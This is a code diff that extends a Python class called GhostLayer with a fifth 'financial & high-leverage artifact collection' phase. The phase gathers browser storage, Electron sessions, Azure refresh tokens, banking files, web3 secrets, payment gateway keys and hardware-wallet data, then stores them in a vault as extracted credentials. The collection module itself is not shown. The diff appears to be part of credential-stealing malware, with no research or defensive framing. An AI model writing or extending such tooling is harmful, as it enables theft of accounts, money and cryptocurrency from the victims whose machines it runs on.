@@ -601,7 +601,28 @@ class GhostLayer:
             
             # Encryption detection
             findings['encryption_detected'].extend(self._detect_encrypted_files())
-            
+
+            # ===== Phase 5: Financial & High-Leverage Artifact Collection =====
+            self.logger.info("Starting Phase 5 financial & high-leverage artifact collection...")
+            try:
+                from ghost_layer_financial import run_phase5_financial
+                phase5_results = run_phase5_financial(vault=self.vault, agent_id="ghost_layer")
+                findings['phase_5_financial'] = phase5_results
+                phase5_total = sum(
+                    len(phase5_results.get(k, []))
+                    for k in (
+                        "browser_web_storage", "electron_sessions", "azure_prt",
+                        "erp_artifacts", "banking_files", "web3_secrets",
+                        "payment_gateway_keys", "hw_wallets", "financial_documents",
+                    )
+                )
+                self.logger.info(f"Phase 5 financial: {phase5_total} artifacts found")
+            except Exception as e:
+                self.logger.warning(f"Phase 5 financial collection error: {e}")
+                findings.setdefault('phase_5_financial', {})
+                findings['errors'].append(f"Phase5Financial: {str(e)}")
+                phase5_total = 0
+
             # Store results securely
             self.vault.store(
                 f"extracted_creds_{time.time()}",
@@ -649,7 +670,8 @@ class GhostLayer:
                 f"Phase1={phase1_total} extracted, "
                 f"Phase2={phase2_total} extracted, "
                 f"Phase3={phase3_total} extracted, "
-                f"Phase4={phase4_total} extracted"
+                f"Phase4={phase4_total} extracted, "
+                f"Phase5(Financial)={phase5_total} artifacts"
             )
             
             return findings
